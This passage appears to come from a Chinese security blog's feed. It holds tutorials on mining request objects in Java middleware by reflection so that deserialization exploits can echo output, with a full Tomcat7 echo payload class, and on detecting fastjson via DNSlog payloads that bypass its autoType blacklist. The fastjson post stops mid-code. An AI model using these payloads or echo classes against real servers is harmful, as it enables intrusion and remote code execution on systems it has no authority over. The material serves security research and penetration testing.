coherence.jar的gadget可如法炮制。近期忙完会将完整的代码上传到github项目<a href="http://github.com/woodpecker-framework/ysoserial-woodpecker.git" target="_blank" rel="noopener">ysoserial-woodpecker</a></p><h2 id="0x07-参考文章"><a href="#0x07-参考文章" class="headerlink" title="0x07 参考文章"></a>0x07 参考文章</h2><ul><li><a href="https://www.cnblogs.com/duanxz/p/3511695.html" target="_blank" rel="noopener">java类中serialversionuid 作用 是什么?举个例子说明</a></li><li><a href="https://www.cnblogs.com/wxd0108/p/6681618.html" target="_blank" rel="noopener">Java自定义类加载器与双亲委派模型</a></li><li><a href="https://rhinosecuritylabs.com/research/java-deserializationusing-ysoserial/" target="_blank" rel="noopener">Java Deserialization Exploitation With Customized Ysoserial Payloads</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>半自动化挖掘request实现多种中间件回显</title>
      <link href="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/"/>
      <url>/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>本文献给永远的<code>Avicii</code>,严格意义上我不算是一个<code>reaver</code>。但并不妨碍我深深的喜欢你的作品，它们陪伴着我度过了无数个编程的夜晚，十分感谢。今天不同人用不同的方式怀念你，我不会作曲，也不敢纹身。能给你分享的是我所热爱的事，在我看来这是最有质感的东西。R.I.P</p><h2 id="0x02-背景"><a href="#0x02-背景" class="headerlink" title="0x02 背景"></a>0x02 背景</h2><p>最近圈子里各位师傅都在分享shiro回显的方法，真是八仙过海过海各显神通。这里我也分享下自己针对回显的思考和解决方案。师傅们基本都是考虑中间件为Tomcat，框架为Shiro的反序列化漏洞如何回显。<strong>这里我从更大的层面来解决回显问题。也就是在任意中间件下，任意框架下可执行任意代码的漏洞如何回显？</strong></p><h2 id="0x03-基本思路"><a href="#0x03-基本思路" class="headerlink" title="0x03 基本思路"></a>0x03 基本思路</h2><p>回显的方式有很多种类，通过获取request对象来回显应该是最优雅通用的方法。而之前师傅们获取requst的方式基本都是去阅读和调试中间件的源码，确定requst存储的位置，最终反射获取。其实提炼出来就是两个步骤。</p><h4 id="第一步：寻找存储有request对象的全局变量"><a href="#第一步：寻找存储有request对象的全局变量" class="headerlink" title="第一步：寻找存储有request对象的全局变量"></a>第一步：寻找存储有request对象的全局变量</h4><p>这一步定位的是requst存储的范围，需要靠知识沉淀或阅读源码来确定request对象被存储到那些全局变量中去了。</p><p>为何要考虑全局变量呢？这是因为只有是全局的，我们才能保证漏洞触发时可以拿到这个对象。</p><p>按照经验来讲Web中间件是多线程的应用，一般requst对象都会存储在线程对象中，可以通过<code>Thread.currentThread()</code>或<code>Thread.getThreads()</code>获取。当然其他全局变量也有可能，这就需要去看具体中间件的源码了。比如前段时间先知上的李三师傅通过查看代码，发现<code>[MBeanServer](https://xz.aliyun.com/t/7535)</code>中也有request对象。</p><h4 id="第二步：半自动化反射搜索全局变量"><a href="#第二步：半自动化反射搜索全局变量" class="headerlink" title="第二步：半自动化反射搜索全局变量"></a>第二步：半自动化反射搜索全局变量</h4><p>这一步定位的是requst存储的具体位置,需要搜索requst对象具体存储在全局变量的那个属性里。我们可以通过反射技术遍历全局变量的所有属性的类型，若包含以下关键字可认为是我们要寻找的request对象。</p><ul><li>Requst</li><li>ServletRequest</li><li>RequstGroup</li><li>RequestInfo</li><li>RequestGroupInfo</li><li>…</li></ul><p><img src="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/request.png" alt="request对象隐藏在全局变量中的位置"></p><h2 id="0x04-编码实现"><a href="#0x04-编码实现" class="headerlink" title="0x04 编码实现"></a>0x04 编码实现</h2><p>思路虽然简单，但实现反射搜索的细节其实还是有很多坑的，这里列举一些比较有意思的点和坑来说说。</p><h4 id="4-1-限制挖掘深度"><a href="#4-1-限制挖掘深度" class="headerlink" title="4.1 限制挖掘深度"></a>4.1 限制挖掘深度</h4><p>对于隐藏过深的requst对象我们最好不考虑，原因有两个。</p><ul><li><p>第一个是这样反射路径过长，就算是搜索到了，最终构造的payload数据会很大，对于shiro这种反序列化数据在头部的漏洞是致命的。</p></li><li><p>第二个是挖掘时间会很长，因为JVM虚拟机内存中的对象结构其实是非常的复杂的，一个对象的属性往往嵌套着另一个对象，另一个对象的属性继续嵌套其他对象…</p></li></ul><p>可以声明两个变量来代表当前深度和最大深度，通过防止当前深度大于最大深度，来限制挖掘深度。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> max_search_depth = <span class="number">1000</span>; <span class="comment">//最大挖掘深度</span></span><br><span class="line"><span class="keyword">int</span> current_depth = <span class="number">0</span> <span class="comment">//当前深度</span></span><br><span class="line"><span class="keyword">while</span>(...)&#123;</span><br><span class="line"><span class="comment">//最多挖多深</span></span><br><span class="line"><span class="keyword">if</span>(current_depth &gt; max_search_depth)&#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//搜索</span></span><br><span class="line">...</span><br><span class="line">current_depth++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-2-排除相同引用的对象"><a href="#4-2-排除相同引用的对象" class="headerlink" title="4.2 排除相同引用的对象"></a>4.2 排除相同引用的对象</h4><p>一个对象中可能会存在其他对象多个相同的实例(引用相同)，是不能重复去遍历它属性的，否则会进入死循环。可以声明一个<code>visited</code>集合来存储已经遍历过的对象，在遍历之前先判断对象是否在该集合中，防止重复遍历！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Set&lt;Object&gt; visited = <span class="keyword">new</span> HashSet&lt;Object&gt;();</span><br><span class="line"><span class="keyword">if</span>(!visited.contains(filed_object))&#123;</span><br><span class="line">visited.add(filed_object);</span><br><span class="line"><span class="comment">//继续搜索</span></span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//跳过</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="4-3-设置黑名单"><a href="#4-3-设置黑名单" class="headerlink" title="4.3 设置黑名单"></a>4.3 设置黑名单</h4><p>某些类型不可能存有requst，一般有如下的系统类型,和一些自定义的类型。对于这些类型的对象的遍历只会浪费时间，我们可以设置一个黑名单将其排除掉。</p><ul><li>java.lang.Byte</li><li>java.lang.Short</li><li>java.lang.Integer</li><li>java.lang.Long</li><li>java.lang.Float</li><li>java.lang.Boolean</li><li>java.lang.String</li><li>java.lang.Class</li><li>java.lang.Character</li><li>java.io.File</li><li>…</li></ul><h4 id="4-4-搜索继承的所有属性"><a href="#4-4-搜索继承的所有属性" class="headerlink" title="4.4 搜索继承的所有属性"></a>4.4 搜索继承的所有属性</h4><p><code>getFields()</code>和<code>getDeclaredFields()</code>其实都没法获取对象的所有属性，导致搜索会有遗漏。比如一个对象的父类的父类的一个私有属性，我们怎么获取呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//向上循环 遍历父类</span></span><br><span class="line"><span class="keyword">for</span> (; clazz != Object.class; clazz = clazz.getSuperclass()) &#123;</span><br><span class="line">    Field[] fields = clazz.getDeclaredFields();</span><br><span class="line">    <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">//搜索</span></span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-5-深度优先-vs-广度优先"><a href="#4-5-深度优先-vs-广度优先" class="headerlink" title="4.5 深度优先 vs 广度优先"></a>4.5 深度优先 vs 广度优先</h4><p>深度优先顾名思义就是会按照深度方向挖掘，它会先遍历至全局变量第一个属性最深层的所有末端，在继续第二属性依次类推。这样挖掘出来的反射链是比较长的。</p><p>在我实现完深度优先算法后，发现最致命的还不是反射链过长问题。深度优先可能会错过比较短的反射链。这是因为同一个requst对象的引用可能被存储在全局对象的多个属性中，有些藏的比较深，有的藏的比较浅。深度优先往往会先挖掘到比较深的那个，而根据我们相同对象不会第二次搜索原则，当搜索到存储比较浅的引用时，会被忽略了。这就导致我们只挖掘到了藏的比较深的，而错过了比较浅的。</p><p><img src="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/111.png" alt="全局变量结构示意图"></p><p>在学过算法，我们都知道广度优先就能解决路径最短问题，在这个问题上也是如此。针对上图的情况，两种算法挖掘的结果如下​。​</p><p>深度优先挖掘到两条反射链</p><ol><li>全局变量 &gt; Field01 &gt; Field03 &gt; Request@111</li><li>全局变量 &gt; Field04 &gt; Request@222</li></ol><p>广度度优先挖掘到两条反射链</p><ol><li>全局变量 &gt; Request@111</li><li>全局变量 &gt; Field04 &gt; Request@222</li></ol><p>而在实际环境中差别更加明显，以下是Tomcat8下搜索记录的对比。</p><p><img src="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/2.png" alt="实际挖掘广度优先挖掘结果与深度优先挖掘结果对比"></p><h2 id="0x05-实战挖掘"><a href="#0x05-实战挖掘" class="headerlink" title="0x05 实战挖掘"></a>0x05 实战挖掘</h2><p>基于以上想法，我设计了一款java内存对象搜索工具java-object-searcher，它可以很方便的帮助我们完成对request对象的搜索，当然不仅仅用于挖掘request。下面以<code>Tomcat7.0.94</code>为例挖掘requst。</p><p>项目地址：<a href="https://github.com/c0ny1/java-object-searcher" target="_blank" rel="noopener">https://github.com/c0ny1/java-object-searcher</a></p><h4 id="5-1-引入java-object-searcher"><a href="#5-1-引入java-object-searcher" class="headerlink" title="5.1 引入java-object-searcher"></a>5.1 引入java-object-searcher</h4><p>去<a href="https://github.com/c0ny1/java-object-searcher/releases" target="_blank" rel="noopener">java-object-searcher项目的releases</a>下载编译好的jar，引入到web项目和调试环境中。</p><h4 id="5-2-编写调用代码进行搜索"><a href="#5-2-编写调用代码进行搜索" class="headerlink" title="5.2 编写调用代码进行搜索"></a>5.2 编写调用代码进行搜索</h4><p>然后我们需要断点打在漏洞触发的位置，因为全局变量会随着中间件和Web项目运行被各个模块修改。而我们需要的是漏洞触发时，全局变量的状态（属性结构和值）。</p><p>接着在IDEA的<code>Evaluate</code>中编写java-object-searcher的调用代码，来搜索全局变量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置搜索类型包含ServletRequest，RequstGroup，Request...等关键字的对象</span></span><br><span class="line">List&lt;Keyword&gt; keys = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">keys.add(<span class="keyword">new</span> Keyword.Builder().setField_type(<span class="string">"ServletRequest"</span>).build());</span><br><span class="line">keys.add(<span class="keyword">new</span> Keyword.Builder().setField_type(<span class="string">"RequstGroup"</span>).build());</span><br><span class="line">keys.add(<span class="keyword">new</span> Keyword.Builder().setField_type(<span class="string">"RequestInfo"</span>).build());</span><br><span class="line">keys.add(<span class="keyword">new</span> Keyword.Builder().setField_type(<span class="string">"RequestGroupInfo"</span>).build());</span><br><span class="line">keys.add(<span class="keyword">new</span> Keyword.Builder().setField_type(<span class="string">"Request"</span>).build());</span><br><span class="line"><span class="comment">//新建一个广度优先搜索Thread.currentThread()的搜索器</span></span><br><span class="line">SearchRequstByBFS searcher = <span class="keyword">new</span> SearchRequstByBFS(Thread.currentThread(),keys);</span><br><span class="line"><span class="comment">//打开调试模式</span></span><br><span class="line">searcher.setIs_debug(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//挖掘深度为20</span></span><br><span class="line">searcher.setMax_search_depth(<span class="number">20</span>);</span><br><span class="line"><span class="comment">//设置报告保存位置</span></span><br><span class="line">searcher.setReport_save_path(<span class="string">"D:\\apache-tomcat-7.0.94\\bin"</span>);</span><br><span class="line">searcher.searchObject();</span><br></pre></td></tr></table></figure><p><img src="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/3.png" alt="编写代码调用java-object-searcher挖掘request"></p><h4 id="5-3-根据挖掘结果构造回显payload"><a href="#5-3-根据挖掘结果构造回显payload" class="headerlink" title="5.3 根据挖掘结果构造回显payload"></a>5.3 根据挖掘结果构造回显payload</h4><p>根据上述挖掘到的反射链来构造回显，具体代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.buf.ByteChunk;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tomcat7EchoByC0ny1</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tomcat7EchoByC0ny1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object obj = Thread.currentThread();</span><br><span class="line">            Field field = obj.getClass().getSuperclass().getDeclaredField(<span class="string">"group"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = obj.getClass().getDeclaredField(<span class="string">"threads"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            Thread[] threads = (Thread[]) obj;</span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">                <span class="keyword">if</span> (thread.getName().contains(<span class="string">"http-apr"</span>) &amp;&amp; thread.getName().contains(<span class="string">"Poller"</span>)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        field = thread.getClass().getDeclaredField(<span class="string">"target"</span>);</span><br><span class="line">                        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        obj = field.get(thread);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        field = obj.getClass().getDeclaredField(<span class="string">"this$0"</span>);</span><br><span class="line">                        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">                        field = obj.getClass().getDeclaredField(<span class="string">"handler"</span>);</span><br><span class="line">                        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">                        field = obj.getClass().getSuperclass().getDeclaredField(<span class="string">"global"</span>);</span><br><span class="line">                        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">                        field = obj.getClass().getDeclaredField(<span class="string">"processors"</span>);</span><br><span class="line">                        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">                        ArrayList processors = (ArrayList) obj;</span><br><span class="line">                        <span class="keyword">for</span> (Object o : processors) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                field = o.getClass().getDeclaredField(<span class="string">"req"</span>);</span><br><span class="line">                                field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                                obj = field.get(o);</span><br><span class="line">                                org.apache.coyote.Request request = (org.apache.coyote.Request) obj;</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">byte</span>[] buf = <span class="string">"Test by c0ny1"</span>.getBytes();</span><br><span class="line">                                ByteChunk bc = <span class="keyword">new</span> ByteChunk();</span><br><span class="line">                                bc.setBytes(buf, <span class="number">0</span>, buf.length);</span><br><span class="line">                                request.getResponse().doWrite(bc);</span><br><span class="line">                            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                                e.printStackTrace();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终生成反序列化数据提交至服务器即可回显</p><p><img src="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/4.png" alt="tomcat回显"></p><p>通过<code>java-object-searcher</code>，我不仅挖掘到了之前师傅们公开的链，还挖掘到了其他未公开的。同时在其他中间件下也实现了回显，下面列举几个比较冷门的中间件。</p><p><strong>1. Jetty</strong></p><p><img src="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/jetty_chain.png" alt></p><p><img src="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/jetty.jpg" alt></p><p><strong>2. WildFly</strong></p><p><img src="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/wildfly_chain.png" alt="wildfly挖掘结果"></p><p><img src="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/wildfly.jpg" alt="wildfly回显"></p><p><strong>3. Resin</strong></p><p><img src="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/resin_chain.png" alt="resin挖掘结果"></p><p><img src="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/resin.jpg" alt="resin回显"></p><h2 id="0x06-最后的思考"><a href="#0x06-最后的思考" class="headerlink" title="0x06 最后的思考"></a>0x06 最后的思考</h2><p>有了半自动化，就想着全自动。这种运行时动态挖掘的局限性是需要人工确定那些全局变量存有request，这是只能半自动的原因。那么是否可以通过静态分析源码的方式来解决呢？比如<a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank" rel="noopener">gadgetinspector</a>原来是挖掘gadget的，能否更换它的<code>source</code>和<code>slink</code>定义，将其改造为全自动化挖掘request呢？有兴趣的朋友可以去试试。</p><p>PS:写到这里我在想Avicii在写完《The Nights》时是怎样的心情，或许和我此时的心情一样，无以言表。</p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>通过dnslog探测fastjson的几种方法</title>
      <link href="/articles/2020/several-ways-to-detect-fastjson-through-dnslog/"/>
      <url>/articles/2020/several-ways-to-detect-fastjson-through-dnslog/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>在渗透测试中遇到json数据一般都会测试下有没有反序列化。然而json库有<code>fastjson</code>,<code>jackson</code>,<code>gson</code>等等。怎么判断后端不是fastjson呢？这就需要构造特定的payload了。</p><p>昨天翻看fastjson源码时发现了一些可以构造dns解析且没在黑名单当中的类，于是顺手给官方提了下<a href="https://github.com/alibaba/fastjson/issues/3077" target="_blank" rel="noopener">Issue</a>。有趣的是后续的师傅们讨论还挺热闹的，我也在这次讨论中学习了很多。这篇文章算是对那些方法的汇总和原理分析。</p><p><img src="/articles/2020/several-ways-to-detect-fastjson-through-dnslog/1.png" alt="给fastjson官方提的issue"></p><h2 id="0x02-方法一-利用java-net-Inet-4-6-Address"><a href="#0x02-方法一-利用java-net-Inet-4-6-Address" class="headerlink" title="0x02  方法一:利用java.net.Inet[4|6]Address"></a>0x02  方法一:利用java.net.Inet[4|6]Address</h2><p>很早之前有一个方法是使用<code>java.net.InetAddress</code>类，现在这个类已经列入黑名单。然而在翻阅fastjson最新版源码(<code>v1.2.67</code>)时，发现两个类没有在黑名单中，于是可以构造了如下payload，即可使fastjson进行DNS解析。下面以<code>java.net.Inet4Address</code>为例分析构造原理。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"java.net.Inet4Address"</span>,<span class="attr">"val"</span>:<span class="string">"dnslog"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"java.net.Inet6Address"</span>,<span class="attr">"val"</span>:<span class="string">"dnslog"</span>&#125;</span><br></pre></td></tr></table></figure><p>我们知道在fastjson在反序列化之前都会调用<code>checkAutoType</code>方法对类进行检查。通过调试发现，由于<code>java.net.Inet4Address</code>不在黑名单中，所以就算开启AutoType也是能过<code>1</code>处的检查。</p><p>fastjson的ParserConfig类自己维护了一个<code>IdentityHashMap</code>，在这个HashMap中的类会被认为是安全的。在<code>2</code>处可以在IdentityHashMap中可以获取到<code>java.net.Inet4Address</code>，所以<code>clazz</code>不为<code>null</code>，导致在<code>3</code>处就返回了。跳过了后续的未开启<code>AutoType</code>的黑名单检查。所以可以发现无论<code>AutoType</code>是否开启，都可以过<code>checkAutoType</code>的检查</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.alibaba.fastjson.parser.ParserConfig#checkAutoType</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="keyword">int</span> features) &#123;</span><br><span class="line">    ...</span><br><span class="line">    Class clazz;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.当打开了autoTypeSupport,类名又不在白名单时进行的黑名单检查</span></span><br><span class="line">    <span class="keyword">if</span> (!internalWhite &amp;&amp; (<span class="keyword">this</span>.autoTypeSupport || expectClassFlag)) &#123;</span><br><span class="line">        hash = h3;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(mask = <span class="number">3</span>; mask &lt; className.length(); ++mask) &#123;</span><br><span class="line">            hash ^= (<span class="keyword">long</span>)className.charAt(mask);</span><br><span class="line">            hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">            ....</span><br><span class="line">            <span class="keyword">if</span> (Arrays.binarySearch(<span class="keyword">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span> &amp;&amp; Arrays.binarySearch(<span class="keyword">this</span>.acceptHashCodes, fullHash) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 2. fastjson的ParserConfig类自己维护了一个IdentityHashMap在这个HashMap中的类会被认为是安全的，会直接被返回。</span></span><br><span class="line">        clazz = <span class="keyword">this</span>.deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">        clazz = (Class)<span class="keyword">this</span>.typeMapping.get(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (internalWhite) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 3. 直接返回，不再走下面的autoTypeSupport和黑名单检查</span></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 4. 不开启autoType时，进行的黑名单检查</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.autoTypeSupport) &#123;</span><br><span class="line">            hash = h3;</span><br><span class="line"></span><br><span class="line">            <span 